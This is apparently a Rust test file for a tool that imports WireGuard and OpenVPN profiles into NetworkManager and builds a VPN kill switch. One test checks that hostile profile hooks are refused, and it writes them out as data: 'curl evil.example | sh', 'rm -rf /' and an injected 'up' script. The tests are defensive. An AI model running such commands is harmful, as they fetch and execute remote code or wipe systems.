// SPDX-FileCopyrightText: 2026 Nubian Ibex and IbexWall contributors
// SPDX-License-Identifier: GPL-3.0-or-later

use super::*;

const PRIV: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

fn wg(extra_interface: &str) -> String {
    format!(
        "[Interface]\nPrivateKey = {PRIV}\nAddress = 10.100.0.2/24, fd00::2/64\nDNS = 10.100.0.1, lan.example\n{extra_interface}\n[Peer]\nPublicKey = {PUB}\nEndpoint = 10.99.0.2:51820\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = 25 # keep NAT open\n"
    )
}

fn tree(files: &[(&str, &str)]) -> (std::path::PathBuf, Sandbox) {
    static N: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
    let root = std::env::temp_dir().join(format!(
        "ibx-vpn-{}-{}",
        std::process::id(),
        N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    ));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).unwrap();
    for (path, content) in files {
        let full = root.join(path.trim_start_matches('/'));
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(full, content).unwrap();
    }
    (root.clone(), Sandbox::at(root))
}

const NM: [(&str, &str); 2] = [
    ("/usr/lib/systemd/system/NetworkManager.service", ""),
    ("/usr/bin/nmcli", ""),
];

fn cfg(value: Value) -> Config {
    serde_json::from_value(value).unwrap()
}

#[test]
fn a_wg_quick_profile_becomes_a_private_keyfile_and_a_public_record() {
    let (root, sandbox) = tree(&NM);
    let ops = plan(
        &sandbox,
        &cfg(json!({ "action": "import", "name": "lab", "profile": wg("") })),
    )
    .unwrap();
    let Op::FileWrite {
        path,
        content,
        mode,
        ..
    } = &ops[0]
    else {
        panic!()
    };
    assert_eq!(
        path,
        "/etc/NetworkManager/system-connections/ibexwall-lab.nmconnection"
    );
    assert_eq!(mode, "0600");
    for line in [
        "type=wireguard",
        "interface-name=wgib-lab",
        "private-key=yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=",
        "endpoint=10.99.0.2:51820",
        "allowed-ips=0.0.0.0/0;::/0;",
        "persistent-keepalive=25",
        "address1=10.100.0.2/24",
        "address1=fd00::2/64",
        "dns=10.100.0.1;",
        "dns-search=lan.example;",
    ] {
        assert!(content.contains(line), "{line}\n{content}");
    }
    let Op::FileWrite {
        content: record,
        mode: record_mode,
        ..
    } = &ops[1]
    else {
        panic!()
    };
    assert_eq!(record_mode, "0644");
    assert!(!record.contains(PRIV) && record.contains("10.99.0.2:51820"));
    // Two writes, then the fixed reload; nothing else.
    assert_eq!(ops.len(), 3);
    assert!(
        matches!(&ops[2], Op::Exec { path, args } if path == "/usr/bin/nmcli" && args == &["connection", "reload"])
    );
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn the_uuid_is_stable_and_well_formed() {
    let id = uuid_for("lab");
    assert_eq!(id, uuid_for("lab"));
    assert_ne!(id, uuid_for("work"));
    let parts: Vec<_> = id.split('-').map(str::len).collect();
    assert_eq!(parts, [8, 4, 4, 4, 12]);
}

#[test]
fn hooks_and_malformed_profiles_are_refused() {
    for (extra, why) in [
        ("PostUp = curl evil.example | sh", "PostUp"),
        ("PreDown = rm -rf /", "PreDown"),
        ("SaveConfig = true", "SaveConfig"),
        ("Table = 123", "Table"),
        ("Bogus = 1", "unknown setting"),
    ] {
        let error = parse_profile(&wg(extra)).unwrap_err();
        assert!(
            error.to_lowercase().contains(&why.to_lowercase()),
            "{extra}: {error}"
        );
    }
    for bad in [
        "".to_string(),
        "[Interface]\nPrivateKey = short\n".to_string(),
        wg("").replace("10.99.0.2:51820", "no-port"),
        wg("").replace("0.0.0.0/0", "not-a-network"),
        wg("").replace("Address = 10.100.0.2/24", "Address = 10.100.0.2/99"),
        "[Weird]\nx=1".to_string(),
        format!("[Interface]\nPrivateKey = {PRIV}\n"),
        "a".repeat(MAX_PROFILE + 1),
    ] {
        assert!(parse_profile(&bad).is_err(), "{bad:?}");
    }
}

#[test]
fn names_and_missing_networkmanager_are_refused() {
    let (root, sandbox) = tree(&NM);
    for name in ["", "Lab", "-lab", "a.b", "toolongnamehere", "a b"] {
        assert!(
            plan(
                &sandbox,
                &cfg(json!({ "action": "import", "name": name, "profile": wg("") }))
            )
            .is_err(),
            "{name}"
        );
    }
    let (bare, sandbox2) = tree(&[]);
    let error = plan(
        &sandbox2,
        &cfg(json!({ "action": "import", "name": "lab", "profile": wg("") })),
    )
    .unwrap_err();
    assert!(error.to_string().contains("NetworkManager"));
    assert!(plan(&sandbox, &cfg(json!({}))).is_err());
    std::fs::remove_dir_all(root).unwrap();
    std::fs::remove_dir_all(bare).unwrap();
}

const OVPN_PLUGIN: (&str, &str) = ("/usr/lib/NetworkManager/VPN/nm-openvpn-service.name", "");

fn ovpn() -> String {
    let ca = "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIUQm9ndXM=\n-----END CERTIFICATE-----";
    let key = "-----BEGIN PRIVATE KEY-----\nMIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg\n-----END PRIVATE KEY-----";
    let crypt = "-----BEGIN OpenVPN Static key V1-----\n0123456789abcdef\n-----END OpenVPN Static key V1-----";
    format!(
        "client\ndev tun\nproto udp\nremote 10.99.0.2 1194\nremote-cert-tls server\ncipher AES-256-GCM\n<ca>\n{ca}\n</ca>\n<cert>\n{ca}\n</cert>\n<key>\n{key}\n</key>\n<tls-crypt>\n{crypt}\n</tls-crypt>\n"
    )
}

#[test]
fn an_openvpn_profile_becomes_owned_files_a_keyfile_and_a_record_with_keys_private() {
    let (root, sandbox) = tree(&[NM[0], NM[1], OVPN_PLUGIN]);
    let ops = plan(
        &sandbox,
        &cfg(json!({ "action": "import", "name": "lab", "profile": ovpn() })),
    )
    .unwrap();
    let written: Vec<(&str, &str)> = ops
        .iter()
        .filter_map(|o| match o {
            Op::FileWrite { path, mode, .. } => Some((path.as_str(), mode.as_str())),
            _ => None,
        })
        .collect();
    for (path, mode) in [
        ("/etc/ibexwall/vpn/openvpn/lab/ca.pem", "0644"),
        ("/etc/ibexwall/vpn/openvpn/lab/cert.pem", "0644"),
        ("/etc/ibexwall/vpn/openvpn/lab/key.pem", "0600"),
        ("/etc/ibexwall/vpn/openvpn/lab/tls-crypt.key", "0600"),
        (
            "/etc/NetworkManager/system-connections/ibexwall-lab.nmconnection",
            "0600",
        ),
        ("/etc/ibexwall/vpn/profiles/lab.json", "0644"),
    ] {
        assert!(
            written.contains(&(path, mode)),
            "{path} {mode}: {written:?}"
        );
    }
    let keyfile = ops
        .iter()
        .find_map(|o| match o {
            Op::FileWrite { path, content, .. } if path.ends_with(".nmconnection") => {
                Some(content.clone())
            }
            _ => None,
        })
        .unwrap();
    assert!(
        keyfile.contains("type=vpn")
            && keyfile.contains("remote=10.99.0.2:1194:udp")
            && keyfile.contains("autoconnect=false")
    );
    assert!(
        !keyfile.contains("PRIVATE KEY"),
        "the keyfile holds paths, not keys"
    );
    assert!(matches!(ops.last(), Some(Op::Exec { path, .. }) if path == "/usr/bin/nmcli"));
    // The record is what the kill switch reads: the server, no secret.
    let record = ops
        .iter()
        .find_map(|o| match o {
            Op::FileWrite { path, content, .. } if path.ends_with("lab.json") => {
                Some(content.clone())
            }
            _ => None,
        })
        .unwrap();
    assert!(
        record.contains("10.99.0.2:1194")
            && record.contains("openvpn")
            && !record.contains("BEGIN")
    );
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn openvpn_needs_the_networkmanager_plugin_and_refuses_hostile_profiles() {
    let (root, sandbox) = tree(&NM);
    let error = plan(
        &sandbox,
        &cfg(json!({ "action": "import", "name": "lab", "profile": ovpn() })),
    )
    .unwrap_err();
    assert!(error.to_string().contains("OpenVPN plugin"), "{error}");
    let (root2, with_plugin) = tree(&[NM[0], NM[1], OVPN_PLUGIN]);
    for bad in [
        ovpn().replace("client\n", "client\nup /tmp/x.sh\n"),
        ovpn().replace("cipher AES-256-GCM", "cipher BF-CBC"),
        "just some text".to_string(),
    ] {
        assert!(
            plan(
                &with_plugin,
                &cfg(json!({ "action": "import", "name": "lab", "profile": bad }))
            )
            .is_err()
        );
    }
    // A server by name cannot be allowed by the kill switch; by address it can.
    let named = ovpn().replace("10.99.0.2", "vpn.example.net");
    let ops = plan(
        &with_plugin,
        &cfg(json!({ "action": "import", "name": "lab", "profile": named })),
    )
    .unwrap();
    assert!(ops.len() > 3);
    for r in [root, root2] {
        std::fs::remove_dir_all(r).unwrap();
    }
}

fn chain_of(ops: &[Op]) -> Chain {
    let Op::NftFragment { fragment } = &ops[1] else {
        panic!()
    };
    serde_json::from_value::<Fragment>(fragment.clone())
        .unwrap()
        .chains
        .remove(0)
}

#[test]
fn the_kill_switch_lets_the_tunnel_and_its_server_through_and_drops_the_rest() {
    let (root, sandbox) = tree(&[
        ("/usr/lib/systemd/system/NetworkManager.service", ""),
        ("/usr/bin/nmcli", ""),
        (
            "/etc/ibexwall/vpn/profiles/lab.json",
            r#"{"endpoints":["10.99.0.2:51820"],"dns":false}"#,
        ),
    ]);
    let ops = plan(
        &sandbox,
        &cfg(json!({ "action": "killswitch", "allow": "10.0.2.2" })),
    )
    .unwrap();
    let chain = chain_of(&ops);
    assert_eq!(chain.name, "net_vpn_out");
    assert_eq!(chain.hook, Hook::Output);
    assert!(chain.rules[0].oif_loopback);
    let prefixes: Vec<_> = chain
        .rules
        .iter()
        .filter_map(|r| r.oif_prefix.clone())
        .collect();
    assert_eq!(prefixes, ["wg", "tun"]);
    let server = chain
        .rules
        .iter()
        .find(|r| r.daddr == ["10.99.0.2"])
        .unwrap();
    assert_eq!(
        (server.dports.clone(), server.protocols.len()),
        (vec![51820], 2)
    );
    assert!(chain.rules.iter().any(|r| r.dports == [67, 547]));
    assert!(chain.rules.iter().any(|r| r.daddr == ["10.0.2.2"]));
    assert_eq!(chain.rules.last().unwrap().verdict, Verdict::Drop);
    // Nothing before the drop accepts "everything".
    assert!(
        chain.rules[..chain.rules.len() - 1]
            .iter()
            .all(|r| r.oif_loopback
                || r.oif_prefix.is_some()
                || !r.daddr.is_empty()
                || !r.dports.is_empty())
    );
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn the_kill_switch_refuses_names_and_an_unknown_server() {
    let (root, sandbox) = tree(&NM);
    assert!(plan(&sandbox, &cfg(json!({ "action": "killswitch" }))).is_err());
    let error = plan(
        &sandbox,
        &cfg(json!({ "action": "killswitch", "endpoints": "vpn.example.com:51820" })),
    )
    .unwrap_err();
    assert!(error.to_string().contains("name"));
    assert!(
        plan(
            &sandbox,
            &cfg(json!({ "action": "killswitch", "endpoints": "10.1.1.1:0" }))
        )
        .is_err()
    );
    assert!(
        plan(
            &sandbox,
            &cfg(json!({ "action": "killswitch", "endpoints": "[2001:db8::1]:51820" }))
        )
        .is_ok()
    );
    assert!(
        plan(
            &sandbox,
            &cfg(json!({ "action": "killswitch", "endpoints": "10.1.1.1:443", "allow": "nope" }))
        )
        .is_err()
    );
    std::fs::remove_dir_all(root).unwrap();
}

fn ids(report: &CheckReport) -> Vec<&str> {
    report.findings.iter().map(|f| f.id.as_str()).collect()
}

#[test]
fn the_check_names_a_vpn_without_a_kill_switch_and_the_dns_conflict() {
    let (root, sandbox) = tree(&[("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":true}"#)]);
    assert_eq!(ids(&evaluate(&sandbox, &[], "now")), ["vpn.no_killswitch"]);
    let (root2, with_dns) = tree(&[
        ("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":true}"#),
        ("/etc/ibexwall/dns/config.toml", "x"),
    ]);
    assert!(ids(&evaluate(&with_dns, &[], "now")).contains(&"vpn.dns_conflict"));
    let (root3, none) = tree(&[]);
    let quiet = evaluate(&none, &[], "now");
    assert!(quiet.findings.is_empty());
    assert!(
        quiet
            .results
            .iter()
            .all(|r| r.outcome == CheckOutcome::NotApplicable)
    );
    for r in [root, root2, root3] {
        std::fs::remove_dir_all(r).unwrap();
    }
}

#[test]
fn a_protected_vpn_passes_and_a_dropped_tunnel_is_explained() {
    let files = [
        ("/etc/ibexwall/vpn/profiles/lab.json", r#"{"dns":false}"#),
        ("/etc/ibexwall/vpn/killswitch.json", "{}"),
    ];
    let (root, sandbox) = tree(&files);
    let up = evaluate(&sandbox, &["wireguard".to_string()], "now");
    assert!(up.findings.is_empty());
    assert_eq!(up.results[0].outcome, CheckOutcome::Pass);
    let down = evaluate(&sandbox, &["802-3-ethernet".to_string()], "now");
    assert_eq!(ids(&down), ["vpn.blocked"]);
    assert_eq!(down.findings[0].severity, Severity::Info);
    std::fs::remove_dir_all(root).unwrap();
}
